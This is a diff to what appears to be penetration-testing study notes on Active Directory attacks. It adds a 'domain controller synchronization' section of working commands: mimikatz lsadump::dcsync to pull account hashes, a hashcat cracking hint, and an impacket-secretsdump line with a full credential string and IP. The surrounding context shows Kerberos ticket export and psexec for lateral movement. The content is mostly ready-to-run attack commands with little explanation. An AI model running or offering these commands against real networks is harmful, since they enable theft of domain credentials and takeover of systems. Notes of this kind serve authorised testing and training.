@@ -122,5 +122,18 @@ PS C:\Tools> klist
 //next we can export the ticket in a file and use it to login into the host the target service can login.
 export KRB5CCNAME=Administrator.ccache
 
+###### domain controller synchronization
+
+```
+//If we own a user that is a member of Domain Admins, Enterprise Admins, or Administrators
+mimikatz # lsadump::dcsync /user:corp\dave
+
+lsadump::dcsync /user:corp\Administrator
+
+//use hashcat to crack it, -m 1000
+
+//in linux
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
 python3 psexec.py -k -no-pass corp.com/Administrator@target-server.corp.com
 ```
